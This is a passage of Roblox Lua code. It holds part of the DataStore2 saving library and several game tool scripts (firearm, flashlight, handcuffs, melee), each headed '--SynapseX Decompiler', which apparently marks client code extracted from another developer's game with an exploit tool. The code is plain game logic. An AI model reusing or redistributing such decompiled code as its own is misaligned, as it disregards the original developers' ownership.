				tableValue = defaultValue
			else
				if self.combinedBeforeInitialGet and not self.combinedInitialGot then
					tableValue = self.combinedBeforeInitialGet(tableValue)
				end
			end
		end

		self.combinedInitialGot = true
		tableResult[self.combinedName] = clone(tableValue)
		self.combinedStore:Set(tableResult, true)
		return tableValue
	end

	function CombinedDataStore:Set(value, dontCallOnUpdate)
		local tableResult = self.combinedStore:GetTable({})
		tableResult[self.combinedName] = value
		self.combinedStore:Set(tableResult, dontCallOnUpdate)
		self:_Update(dontCallOnUpdate)
	end

	function CombinedDataStore:Update(updateFunc)
		self:Set(updateFunc(self:Get()))
		self:_Update()
	end

	function CombinedDataStore:OnUpdate(callback)
		if not self.onUpdateCallbacks then
			self.onUpdateCallbacks = { callback }
		else
			self.onUpdateCallbacks[#self.onUpdateCallbacks + 1] = callback
		end
	end

	function CombinedDataStore:_Update(dontCallOnUpdate)
		if not dontCallOnUpdate then
			for _, callback in pairs(self.onUpdateCallbacks or {}) do
				callback(self:Get(), self)
			end
		end

		self.combinedStore:_Update(true)
	end

	function CombinedDataStore:SetBackup(retries)
		self.combinedStore:SetBackup(retries)
	end
end

local DataStoreMetatable = {}

DataStoreMetatable.__index = DataStore

--Library
local DataStoreCache = {}

local DataStore2 = {}
local combinedDataStoreInfo = {}

--[[**
	<description>
	Run this once to combine all keys provided into one "main key".
	Internally, this means that data will be stored in a table with the key mainKey.
	This is used to get around the 2-DataStore2 reliability caveat.
	</description>

	<parameter name = "mainKey">
	The key that will be used to house the table.
	</parameter>

	<parameter name = "...">
	All the keys to combine under one table.
	</parameter>
**--]]
function DataStore2.Combine(mainKey, ...)
	for _, name in pairs({...}) do
		combinedDataStoreInfo[name] = mainKey
	end
end

function DataStore2.ClearCache()
	DataStoreCache = {}
end

function DataStore2:__call(dataStoreName, player)
	assert(typeof(dataStoreName) == "string" and typeof(player) == "Instance", ("DataStore2() API call expected {string dataStoreName, Instance player}, got {%s, %s}"):format(typeof(dataStoreName), typeof(player)))
	if DataStoreCache[player] and DataStoreCache[player][dataStoreName] then
		return DataStoreCache[player][dataStoreName]
	elseif combinedDataStoreInfo[dataStoreName] then
		local dataStore = DataStore2(combinedDataStoreInfo[dataStoreName], player)

		dataStore:BeforeSave(function(combinedData)
			for key in pairs(combinedData) do
				if combinedDataStoreInfo[key] then
					local combinedStore = DataStore2(key, player)
					local value = combinedStore:Get(nil, true)
					if value ~= nil then
						if combinedStore.combinedBeforeSave then
							value = combinedStore.combinedBeforeSave(clone(value))
						end
						combinedData[key] = value
					end
				end
			end

			return combinedData
		end)

		local combinedStore = setmetatable({
			combinedName = dataStoreName,
			combinedStore = dataStore
		}, {
			__index = function(self, key)
				return CombinedDataStore[key] or dataStore[key]
			end
		})

		if not DataStoreCache[player] then
			DataStoreCache[player] = {}
		end

		DataStoreCache[player][dataStoreName] = combinedStore
		return combinedStore
	end

	local dataStore = {}

	dataStore.Name = dataStoreName
	dataStore.UserId = player.UserId

	dataStore.callbacks = {}
	dataStore.beforeInitialGet = {}
	dataStore.afterSave = {}
	dataStore.bindToClose = {}
	dataStore.savingMethod = SavingMethods.OrderedBackups.new(dataStore)

	setmetatable(dataStore, DataStoreMetatable)

	local event, fired = Instance.new("BindableEvent"), false

	game:BindToClose(function()
		if not fired then
			event.Event:wait()
		end

		local value = dataStore:Get(nil, true)

		for _, bindToClose in pairs(dataStore.bindToClose) do
			bindToClose(player, value)
		end
	end)

	local playerLeavingConnection
	playerLeavingConnection = player.AncestryChanged:Connect(function()
		if player:IsDescendantOf(game) then return end
		playerLeavingConnection:Disconnect()
		dataStore:Save()
		event:Fire()
		fired = true

		delay(40, function() --Give a long delay for people who haven't figured out the cache :^(
			DataStoreCache[player] = nil
		end)
	end)

	if not DataStoreCache[player] then
		DataStoreCache[player] = {}
	end

	DataStoreCache[player][dataStoreName] = dataStore

	return dataStore
end

return setmetatable(DataStore2, DataStore2)

    mainmodule.savingmethods
    return {
	OrderedBackups = require(script.OrderedBackups),
}

    mainmodule.savingmethods.orderedbackups
      --[[
	berezaa's method of saving data (from the dev forum):

	What I do and this might seem a little over-the-top but it's fine as long as you're not using datastores excessively elsewhere is have a datastore and an ordereddatastore for each player. When you perform a save, add a key (can be anything) with the value of os.time() to the ordereddatastore and save a key with the os.time() and the value of the player's data to the regular datastore. Then, when loading data, get the highest number from the ordered data store (most recent save) and load the data with that as a key.

	Ever since I implemented this, pretty much no one has ever lost data. There's no caches to worry about either because you're never overriding any keys. Plus, it has the added benefit of allowing you to restore lost data, since every save doubles as a backup which can be easily found with the ordereddatastore

	edit: while there's no official comment on this, many developers including myself have noticed really bad cache times and issues with using the same datastore keys to save data across multiple places in the same game. With this method, data is almost always instantly accessible immediately after a player teleports, making it useful for multi-place games.
--]]

local DataStoreService = game:GetService("DataStoreService")

local OrderedBackups = {}
OrderedBackups.__index = OrderedBackups

function OrderedBackups:Get()
	local success, value = pcall(function()
		return self.orderedDataStore:GetSortedAsync(false, 1):GetCurrentPage()[1]
	end)

	if not success then
		return false, value
	end

	if value then
		local mostRecentKeyPage = value

		local recentKey = mostRecentKeyPage.value
		self.dataStore2:Debug("most recent key", mostRecentKeyPage)
		self.mostRecentKey = recentKey

		local success, value = pcall(function()
			return self.dataStore:GetAsync(recentKey)
		end)

		if not success then
			return false, value
		end

		return true, value
	else
		self.dataStore2:Debug("no recent key")
		return true, nil
	end
end

function OrderedBackups:Set(value)
	local key = (self.mostRecentKey or 0) + 1

	local success, problem = pcall(function()
		self.dataStore:SetAsync(key, value)
	end)

	if not success then
		return false, problem
	end

	local success, problem = pcall(function()
		self.orderedDataStore:SetAsync(key, key)
	end)

	if not success then
		return false, problem
	end

	self.mostRecentKey = key
	return true
end

function OrderedBackups.new(dataStore2)
	local dataStoreKey = dataStore2.Name .. "/" .. dataStore2.UserId

	local info = {
		dataStore2 = dataStore2,
		dataStore = DataStoreService:GetDataStore(dataStoreKey),
		orderedDataStore = DataStoreService:GetOrderedDataStore(dataStoreKey),
	}

	return setmetatable(info, OrderedBackups)
end

return OrderedBackups
mainmodule.tableutil
    local TableUtil = {}

function TableUtil.clone(tbl)
	local clone = {}

	for key, value in pairs(tbl) do
		if typeof(value) == "table" then
			clone[key] = TableUtil.clone(value)
		else
			clone[key] = value
		end
	end

	return clone
end

return TableUtil

    mainmodule.verifier

    local Verifier = {}

function Verifier.typeValid(data)
	return type(data) ~= "userdata", typeof(data)
end

function Verifier.scanValidity(tbl, passed, path)
	if type(tbl) ~= "table" then
		return Verifier.scanValidity({input = tbl}, {}, {})
	end
	passed, path = passed or {}, path or {"input"}
	passed[tbl] = true
	local tblType
	do
		local key, value = next(tbl)
		if type(key) == "number" then
			tblType = "Array"
		else
			tblType = "Dictionary"
		end
	end
	local last = 0
	for key, value in next, tbl do
		path[#path + 1] = tostring(key)
		if type(key) == "number" then
			if tblType == "Dictionary" then
				return false, path, "Mixed Array/Dictionary"
			elseif key%1 ~= 0 then  -- if not an integer
				return false, path, "Non-integer index"
			elseif key == math.huge or key == -math.huge then
				return false, path, "(-)Infinity index"
			end
		elseif type(key) ~= "string" then
			return false, path, "Non-string key", typeof(key)
		elseif tblType == "Array" then
			return false, path, "Mixed Array/Dictionary"
		end
		if tblType == "Array" then
			if last ~= key - 1 then
				return false, path, "Array with non-sequential indexes"
			end
			last = key
		end
		local isTypeValid, valueType = Verifier.typeValid(value)
		if not isTypeValid then
			return false, path, "Invalid type", valueType
		end
		if type(value) == "table" then
			if passed[value] then
				return false, path, "Cyclic"
			end
			local isValid, keyPath, reason, extra = Verifier.scanValidity(value, passed, path)
			if not isValid then
				return isValid, keyPath, reason, extra
			end
		end
		path[#path] = nil
	end
	passed[tbl] = nil
	return true
end

function Verifier.getStringPath(path)
	return table.concat(path, ".")
end

function Verifier.warnIfInvalid(input)
	local isValid, keyPath, reason, extra = Verifier.scanValidity(input)
	if not isValid then
		if extra then
			warn("Invalid at "..Verifier.getStringPath(keyPath).." because: "..reason.." ("..tostring(extra)..")")
		else
			warn("Invalid at "..Verifier.getStringPath(keyPath).." because: "..reason)
		end
	end

	return isValid
end

return Verifier

    serverstorage.toolhandler
    --SynapseX Decompiler

local API = {}
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Soundscape = game:GetService("SoundService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local RemoteHandler = require(script.Parent.RemoteHandler)
local AnimationController = require(script.Parent.AnimationController)
local ClientFunctions = require(script.Parent.ClientFunctions)
local Items = require(ReplicatedStorage.Databases.Items)
local Tools = require(ReplicatedStorage.Databases.Tools)
local Assets = require(ReplicatedStorage.Databases.Assets)
local player = Players.LocalPlayer
local humanoid
local lastRem = tick()
local radioRem = RemoteHandler.Event.new("RadioUpdate")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local addItem = Debris.AddItem
local LOG_DISTANCE = 35
local LOG_DELAY = 2
function API.Init(hum)
	humanoid = hum
end
function API.SpawnToolEffect(tool, id, effectTable)
	if tool and tool:IsDescendantOf(workspace) then
		local assetTable = Assets.Tools[Items[id].Asset]
		for i, v in ipairs(effectTable) do
			do
				local effect
				if v[2] == "Sound" then
					local soundTable = assetTable.Sound[v[1]]
					effect = INST("Sound")
					effect.Looped = false
					effect.SoundId = soundTable[1]
					effect.SoundGroup = soundTable[3] and Soundscape[soundTable[3]]
					effect.Parent = tool[soundTable[2]]
					if soundTable[4] then
						effect.MinDistance = soundTable[4][1]
						effect.MaxDistance = soundTable[4][2]
					end
					effect:Play()
					pcall(function()
						if v[1] == "Fire" and humanoid and humanoid.Health > 0 and Tools[id] and tick() - lastRem >= LOG_DELAY then
							local dist = player:DistanceFromCharacter(tool:FindFirstChildWhichIsA("BasePart").Position)
							if dist ~= 0 and dist <= LOG_DISTANCE then
								lastRem = tick()
								radioRem:Fire()
							end
						end
					end)
				elseif v[2] == "SpotLight" then
					effect = assetTable.Light[2]:Clone()
					effect.Parent = tool[assetTable.Light[1]]
					effect.Enabled = true
					wait(0.1)
					effect.Enabled = false
				elseif v[2] == "ParticleEmitter" then
					effect = assetTable.Smoke[2]:Clone()
					effect.Parent = tool[assetTable.Smoke[1]]
					effect.Enabled = true
					wait(0.1)
					effect.Enabled = false
				end
				if effect then
					addItem(Debris, effect, 5)
				end
			end
		end
	end
end
RemoteHandler.Event.new("ToolEffect").OnEvent:Connect(function(tool, id, effectName, typeName)
	API.SpawnToolEffect(tool, id, effectName, typeName)
end)
function API.SpawnToolFire(hitPart, position, surfaceNormal, mat, less)
	pcall(function()
	local part = INST("Part")
	part.CanCollide = false
	part.Transparency = 1
	part.CFrame = CF(position, position + surfaceNormal)
	part.Size = V3(0.2, 0.2, 0.2)
	part.Anchored = true
	part.Parent = game.Workspace.InvisibleParts
	if mat then
		local sound = INST("Sound")
		sound.Volume = less and 0.1 or 0.7
		sound.SoundId = Assets.ImpactSounds[mat] or Assets.ImpactSounds[Enum.Material.Plastic]
		sound.EmitterSize = 10
		sound.MaxDistance = 60
		sound.Parent = part
		sound:Play()
	end
		if hitPart and hitPart:IsA("BasePart") then
			
		local debrisEffect = ReplicatedStorage.Effects.DebrisEffect:Clone()
		debrisEffect.Color = COLSEQ(hitPart.BrickColor.Color)
		debrisEffect.Parent = part
		debrisEffect:Emit(less and 10 or 50)
	end
	addItem(Debris, part, 4)
	pcall(function()
		if humanoid and humanoid.Health > 0 and tick() - lastRem >= LOG_DELAY then
			local dist = player:DistanceFromCharacter(position)
			if dist ~= 0 and dist <= LOG_DISTANCE then
				lastRem = tick()
				radioRem:Fire()	
				end
			end
		end)	
	end)
end
RemoteHandler.Event.new("ToolExec").OnEvent:Connect(function(hitTable)
	for _, v in ipairs(hitTable) do
		API.SpawnToolFire(v[1], v[2], v[3], v[4], #hitTable > 1)
	end
end)
RemoteHandler.Event.new("TaserEvent").OnEvent:Connect(function(disableBool)
	ClientFunctions.MovementEnable(not disableBool)
	ClientFunctions.InterruptBind:Fire()
end)
return API

  toolhandler.firearm
  --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local Firearm = {}
Firearm.__index = Firearm
setmetatable(Firearm, ToolInterface)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CollectionService = game:GetService("CollectionService")
local KeyBinder = require(script.Parent.Parent.KeyBinder)
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local ToolHandler = require(script.Parent)
local Tweening = require(script.Parent.Parent.Tweening)
local DynamicArms = require(script.Parent.Parent.DynamicArms)
local InventoryController = require(script.Parent.Parent.InventoryController)
local Assets = require(ReplicatedStorage.Databases.Assets)
local Items = require(ReplicatedStorage.Databases.Items)
local GLASS_TAG = "Glass"
local GLASS_SMASH_TAG = "Ignore"
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local vehicleFolder = workspace.Vehicles
local addItem = Debris.AddItem
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
function Firearm.new(tool, id, humanoid, gui, noEvents)
	local self = ToolInterface.new(tool, id, humanoid, gui)
	setmetatable(self, Firearm)
	self.Ready = true
	self.AmmoReady = false
	self.MagSize = self.ToolTable.MagSize
	self.FireRemote = RemoteHandler.Event.new("ToolExec")
	self.ReloadRemote = RemoteHandler.Event.new("Reload")
	self.ParentGui = gui
	self.Gui = ReplicatedStorage.UI.FirearmFrame:Clone()
	self.Multishot = self.ToolTable.Multishot
	self.Rounds = 0
	local item = InventoryController.HaveItem(tool.Name, true)
	if self.ToolTable.Magazine and item[3] and item[3].Mag then
		local mag = InventoryController.HaveItem(item[3].Mag, true)
		if mag then
			self.Mag = mag
			self.Rounds = mag[3].R
		end
	elseif not self.ToolTable.Magazine then
		self.Rounds = item[3].R
	end
	self.AmmoReady = self.Rounds > 0
	self.Auto = false
	self.FireBind = Instance.new("BindableEvent")
	self.Fired = self.FireBind.Event
	self.Aiming = false
	self.Camera = workspace.CurrentCamera
	self.Barrel = self.Tool:WaitForChild("Barrel")
	self.AimPart = self.Tool:WaitForChild("AimPart")
	self.MouseDown = false
	self:UpdateGui()
	return self
end
function Firearm:OnEquip()
	self:UpdateGui()
	self.MouseDown = false
	self.GunCursor = Assets.GunCursor
	self.AimCursor = Assets.AimCursor
	mouse.Icon = self.GunCursor
	self.InventoryConn = InventoryController.OnEdit:Connect(function()
		self:UpdateGui()
	end)
	self.InventoryConnEdit = InventoryController.OnUpdate:Connect(function()
		self:UpdateGui()
	end)
	local function TriggerReload(inputObject)
		if inputObject.UserInputState == Enum.UserInputState.End then
			self:Reload()
		end
	end
	if self.ToolTable.Auto then
		self.ModeKey = KeyBinder.KeyAction.new("Auto", self.Auto and "Auto" or "Semi-Auto", {
			Enum.KeyCode.V
		}, function(inputObject)
			if inputObject.UserInputState == Enum.UserInputState.End then
				self.Auto = not self.Auto
				self.MouseDown = false
				if self.ModeKey then
					self.ModeKey:Update(self.Auto and "Auto" or "Semi-Auto", "Auto")
				end
			end
		end)
	end
	self.ReloadKey = KeyBinder.KeyAction.new("Reload", "Reload", {
		Enum.KeyCode.R
	}, TriggerReload)
	self.AimKey = KeyBinder.KeyAction.new("Aim", "Aim", {
		Enum.KeyCode.Q
	}, function(inputObject)
		if inputObject.UserInputState == Enum.UserInputState.Begin and self.Ready then
			self:Aim(not self.Aiming)
		end
	end)
	self.MouseEvent = UserInputService.InputBegan:connect(function(inputObject, processed)
		if inputObject.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
			local thisTick = tick()
			self.MouseDown = self.Auto and thisTick
			repeat
				self:Fire(mouse)
				wait()
			until self.MouseDown ~= thisTick
		elseif inputObject.UserInputType == Enum.UserInputType.MouseButton2 and not processed and self.Ready then
			self:Aim(true)
		end
	end)
	self.MouseEventEnd = UserInputService.InputEnded:connect(function(inputObject, processed)
		if inputObject.UserInputType == Enum.UserInputType.MouseButton2 and not processed then
			self:Aim(false)
		elseif inputObject.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
			self.MouseDown = false
		end
	end)
	if not self.Ready and not self.ReadyDebounce then
		self.ReadyDebounce = true
		wait(0.5)
		self.Ready = true
		self.ReadyDebounce = false
	end
end
function Firearm:OnUnequip()
	mouse.Icon = ""
	if self.ReloadKey then
		self.ReloadKey:Remove()
		self.ReloadKey = nil
	end
	if self.AimKey then
		self.AimKey:Remove()
		self.AimKey = nil
	end
	if self.MouseEvent then
		self.MouseEvent:Disconnect()
		self.MouseEvent = nil
	end
	if self.MouseEventEnd then
		self.MouseEventEnd:Disconnect()
		self.MouseEventEnd = nil
	end
	if self.InventoryConn then
		self.InventoryConn:Disconnect()
		self.InventoryConn = nil
	end
	if self.InventoryConnEdit then
		self.InventoryConnEdit:Disconnect()
		self.InventoryConnEdit = nil
	end
	if self.ToolTable.Auto and self.ModeKey then
		self.ModeKey:Remove()
		self.ModeKey = nil
	end
	self:Aim(false)
end
function Firearm:Aim(aimBool)
	if aimBool and not DynamicArms.CanAim() then
		return
	end
	self.Aiming = aimBool
	UserInputService.MouseDeltaSensitivity = aimBool and self.ToolTable.FoV / 70 or 1
	DynamicArms.SetAimPart(aimBool and self.AimPart or nil)
	Tweening.NewTween(self.Camera, "FieldOfView", aimBool and self.ToolTable.FoV or 70, 0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	mouse.Icon = aimBool and self.AimCursor or self.Equipped and self.GunCursor or ""
	if aimBool then
		do
			local endConn
			endConn = DynamicArms.GetEndAimEvent():Connect(function()
				endConn:Disconnect()
				if self.Equipped then
					self:Aim(false)
				end
			end)
		end
	end
end
function Firearm:UpdateCursor()
	if self.Equipped then
		mouse.Icon = self.Aiming and self.AimCursor or self.GunCursor
	end
end
function Firearm:UpdateGui()
	local pattern = "%03d"
	self.Gui:WaitForChild("MagLabel").Text = FORMAT(pattern, self.Rounds)
	self.Gui:WaitForChild("TotalLabel").Text = FORMAT(pattern, self:GetReadyRounds())
end
function Firearm:Fire(mouse)
	if (self.Ready or self.Reloading and not self.FireFlag) and self.AmmoReady then
		self.Ready = false
		self.FireBind:Fire()
		self.Rounds = self.Rounds - 1
		if self.Rounds <= 0 then
			self.AmmoReady = false
		end
		if self.Mag then
			local magAtt = self.Mag[3]
			magAtt.R = magAtt.R - 1
			InventoryController.EditAttributes(self.Mag[1], true, magAtt)
		elseif not self.ToolTable.Magazine then
			InventoryController.EditAttributes(self.Tool.Name, true, {
				R = self.Rounds
			})
		end
		self:UpdateGui()
		self:TriggerEffect({
			self.FireSound,
			self.Smoke,
			self.Light
		})
		do
			local fireTrack = self:MakeTrack(self.Animations.Fire)
			table.insert(self.CurrentAnimations, fireTrack)
			fireTrack.KeyframeReached:connect(function(keyframeName)
				if keyframeName == "End" then
					fireTrack:Stop(0)
					fireTrack:Destroy()
					self.Ready = true
				elseif keyframeName == "Pump" then
					self:TriggerEffect({
						self.PumpSound
					})
				end
			end)
			fireTrack:Play(0)
			local rotY = (RANDOM() - 0.5) * self.ToolTable.Recoil / 2
			Tweening.NewRecoilTween(self.Camera, self.ToolTable.Recoil, rotY, 0.1, "outQuad")
			delay(0.1, function()
				Tweening.NewRecoilTween(self.Camera, -self.ToolTable.Recoil, -rotY, 0.2, "outQuad")
			end)
			local mousePos = mouse.Hit.p
			local humanoidHit = false
			local distance = (self.Barrel.Position - mousePos).Magnitude
			local originPos = (self.Torso.CFrame * CF(0, 1.5, 0)).p
			local hitTable = {}
			for i = 1, self.Multishot and 9 or 1 do
				local spread = self.ToolTable.Spread / 50 * distance
				local endPos = V3(mousePos.x + (RANDOM() * (spread * 2) - spread), mousePos.y + (RANDOM() * (spread * 2) - spread), mousePos.z + (RANDOM() * (spread * 2) - spread))
				local hit, position, sur, mat = self:Raycast(originPos, endPos, self:GetIgnoreList(self.Character), self.ToolTable.Range)
				local hum, vehicle
				if hit then
					hum = hit.Parent:FindFirstChild("Humanoid")
					if CollectionService:HasTag(hit, GLASS_TAG) then
						table.insert(hitTable, {
							hit,
							position,
							sur,
							mat
						})
						hit, position, sur, mat = self:Raycast(originPos, endPos, self:GetIgnoreList(self.Character, hit), self.ToolTable.Range)
					elseif not hum then
						vehicle = hit.Parent:IsDescendantOf(vehicleFolder)
					end
				end
				table.insert(hitTable, {
					hit,
					position,
					sur,
					mat
				})
				if not (not hit or hum or CollectionService:HasTag(hit, GLASS_TAG)) or vehicle then
					ToolHandler.SpawnToolFire(hit, position, sur, mat, self.Multishot)
				end
				if hum or vehicle then
					humanoidHit = true
				end
			end
			if #hitTable > 0 then
				self.FireRemote:Fire(self.Tool, hitTable)
			end
			if humanoidHit then
				do
					local hitTick = tick()
					self.LastMarker = hitTick
					self.GunCursor = Assets.GunMarker
					self.AimCursor = Assets.AimMarker
					self:UpdateCursor()
					local hitSound = Instance.new("Sound")
					hitSound.SoundId = Assets.HitMarkerSound
					hitSound.Volume = 0.5
					hitSound.Parent = self.ParentGui
					hitSound:Play()
					delay(0.5, function()
						if hitTick == self.LastMarker then
							self.GunCursor = Assets.GunCursor
							self.AimCursor = Assets.AimCursor
							self:UpdateCursor()
						end
						hitSound:Destroy()
					end)
				end
			end
		end
	elseif self.Ready and not self.AmmoReady then
		self.Ready = false
		self:TriggerEffect({
			self.EmptySound
		})
		wait(0.1)
		self.Ready = true
	end
end
local SortAmmo = function(a, b)
	return a[3].R > b[3].R
end
local SortAmmoO = function(a, b)
	return a[3].R < b[3].R
end
function Firearm:GetReadyRounds()
	local sum = 0
	local inv = InventoryController.GetInventory()
	for i, v in pairs(inv) do
		local iTable = Items[v[2]]
		if iTable.Type == "Magazine" and iTable.Rounds == self.ToolTable.Rounds and 0 < v[3].R and (self.Mag and v[1] ~= self.Mag[1] or not self.Mag) then
			sum = sum + v[3].R
		end
	end
	return sum
end
function Firearm:GetMags()
	local mags = {}
	local inv = InventoryController.GetInventory()
	for i, v in pairs(inv) do
		local iTable = Items[v[2]]
		if iTable.Type == "Magazine" and iTable.Rounds == self.ToolTable.Rounds and v[3].R > 0 and (self.Mag and v[1] ~= self.Mag[1] or not self.Mag) then
			table.insert(mags, v)
		end
	end
	table.sort(mags, self.ToolTable.Magazine and SortAmmo or SortAmmoO)
	return mags
end
function Firearm:Reload()
	if self.Ready then
		if self.MagSize and self.Rounds >= self.MagSize then
			return
		end
		do
			local mags = self:GetMags()
			if #mags <= 0 then
				return
			end
			if self.Mag and mags[1][3].R <= self.Rounds then
				return
			end
			self.Ready = false
			self.Reloading = true
			self:Aim(false)
			self.FireFlag = false
			local localFlag = false
			local fireConn
			fireConn = self.Fired:Connect(function()
				fireConn:Disconnect()
				self.FireFlag = true
				localFlag = true
			end)
			local currentRounds = self.Rounds
			local totalRounds = self:GetReadyRounds()
			local target
			if not self.ToolTable.Magazine then
				if totalRounds < self.MagSize - self.Rounds then
					target = totalRounds + self.Rounds
				else
					target = self.Rounds + (self.MagSize - self.Rounds)
				end
			end
			if self.ToolTable.Magazine then
				self:TriggerEffect({
					self.ReloadSound
				})
			end
			local AfterThread
			local function ReloadThread()
				currentRounds = currentRounds + 1
				local reloadTrack = self:MakeTrack(self.Animations.Reload)
				table.insert(self.CurrentAnimations, reloadTrack)
				reloadTrack:Play()
				reloadTrack.KeyframeReached:Connect(function(keyframeName)
					if self.FireFlag or localFlag then
						reloadTrack:Stop()
						reloadTrack:Destroy()
						self.Reloading = false
						return
					end
					if keyframeName == "ReloadEnd" and not self.ToolTable.Magazine then
						self:TriggerEffect({
							self.ReloadSound
						})
					end
					if keyframeName == "ReloadEnd" and currentRounds ~= target or keyframeName == "End" then
						reloadTrack:Stop()
						reloadTrack:Destroy()
						AfterThread(currentRounds, nil)
					end
				end)
			end
			function AfterThread(i, reloadTrack)
				if self.ToolTable.Magazine then
					self.Mag = mags[1]
					self.Rounds = mags[1][3].R
					self.ReloadRemote:Fire(self.Tool.Name, mags[1][1])
				else
					for i = 1, #mags do
						if mags[i][3].R > 0 then
							self.Rounds = self.Rounds + 1
							InventoryController.EditAttributes(mags[1][1], true, {
								R = mags[1][3].R - 1
							})
							self.ReloadRemote:Fire(self.Tool.Name, mags[i][1])
							break
						end
					end
				end
				self:UpdateGui()
				self.AmmoReady = true
				if self.ToolTable.Magazine or i == target then
					fireConn:Disconnect()
					self.Ready = true
					self.Reloading = false
				else
					ReloadThread()
				end
			end
			ReloadThread()
		end
	end
end
return Firearm

    toolhandler.flashlight
    --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local Flashlight = {}
Flashlight.__index = Flashlight
setmetatable(Flashlight, ToolInterface)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local KeyBinder = require(script.Parent.Parent.KeyBinder)
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local ToolHandler = require(script.Parent)
local DEBOUNCE_TIME = 0.5
local player = Players.LocalPlayer
local lightRemote = RemoteHandler.Event.new("Flashlight")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
function Flashlight.new(tool, id, humanoid, gui)
	local self = ToolInterface.new(tool, id, humanoid, gui)
	setmetatable(self, Flashlight)
	self.Activated = false
	self.Debounce = false
	self.LightPart = tool:WaitForChild("LightPart")
	self.Light = self.LightPart:WaitForChild("FlashlightLight")
	return self
end
function Flashlight:OnEquip()
	self.FlashKey = KeyBinder.KeyAction.new("FlashlightToggle", "Flashlight " .. (self.Activated and "Off" or "On"), {
		Enum.KeyCode.E
	}, function(inputObject)
		if inputObject.UserInputState == Enum.UserInputState.End then
			self:ToggleLight()
		end
	end)
end
function Flashlight:OnUnequip()
	if self.FlashKey then
		self.FlashKey:Remove()
		self.FlashKey = nil
	end
end
function Flashlight:ToggleLight()
	if not self.Debounce then
		self.Debounce = true
		self.Activated = not self.Activated
		self.Light.Enabled = self.Activated
		self.LightPart.Transparency = self.Activated and 0 or 1
		self:TriggerEffect({
			self["Flashlight" .. (self.Activated and "On" or "Off") .. "Sound"]
		})
		self.FlashKey:Update("Flashlight " .. (self.Activated and "Off" or "On"))
		lightRemote:Fire(self.Tool, self.Activated)
		wait(DEBOUNCE_TIME)
		self.Debounce = false
	end
end
return Flashlight

      toolhandler.handcuffs
      --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local Handcuffs = {}
Handcuffs.__index = Handcuffs
setmetatable(Handcuffs, ToolInterface)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ClientFunctions = require(script.Parent.Parent.ClientFunctions)
local InteractController = require(script.Parent.Parent.InteractController)
local MovementController = require(script.Parent.Parent.MovementController)
local JusticeController = require(script.Parent.Parent.JusticeController)
local NotificationHandler = require(script.Parent.Parent.NotificationHandler)
local player = Players.LocalPlayer
local seats = {}
for _, v in pairs(workspace:GetDescendants()) do
	if v.ClassName == "Seat" then
		seats[#seats + 1] = v
	end
end
function Handcuffs.new(tool, id, humanoid, gui, button)
	local self = ToolInterface.new(tool, id, humanoid, gui)
	setmetatable(self, Handcuffs)
	return self
end
local function SetSeats(enabled)
	enabled = not enabled
	for _, v in pairs(seats) do
		v.Disabled = enabled
	end
end
function Handcuffs:OnEquip()
	ClientFunctions.InterruptBind:Fire()
	ClientFunctions.DisableTools(true)
	MovementController.DisableRunning(true)
	MovementController.DisableJumping(true)
	InteractController.Stop()
	SetSeats(false)
	self.Humanoid.Sit = false
	NotificationHandler.NewNotification("You have been handcuffed. Leaving the game may result in a temporary ban.", "Handcuffed!", "Red", true)
	if JusticeController.HasGrab() then
		JusticeController.GrabPlayer(JusticeController.GetPlayerGrab())
	end
end
function Handcuffs:OnUnequip()
	SetSeats(true)
	ClientFunctions.DisableTools(false)
	MovementController.DisableRunning(false)
	MovementController.DisableJumping(false)
	InteractController.Init()
end
return Handcuffs

  toolhandler
  --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local Melee = {}
Melee.__index = Melee
setmetatable(Melee, ToolInterface)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CollectionService = game:GetService("CollectionService")
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local ToolHandler = require(script.Parent)
local DEBOUNCE_TIME = 0.5
local DAMAGE_COOLDOWN = 0.15
local GLASS_TAG = "Glass"
local IGNORE_TAG = "Ignore"
local player = Players.LocalPlayer
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
function Melee.new(tool, id, humanoid, gui)
	local self = ToolInterface.new(tool, id, humanoid, gui)
	setmetatable(self, Melee)
	self.Debounce = false
	self.HitPart = tool:WaitForChild("HitPart")
	self.FireRemote = RemoteHandler.Event.new("ToolExec")
	self.Smash = not self.ToolTable.NoSmash
	return self
end
function Melee:OnEquip()
	self.MouseEvent = UserInputService.InputBegan:connect(function(inputObject, processed)
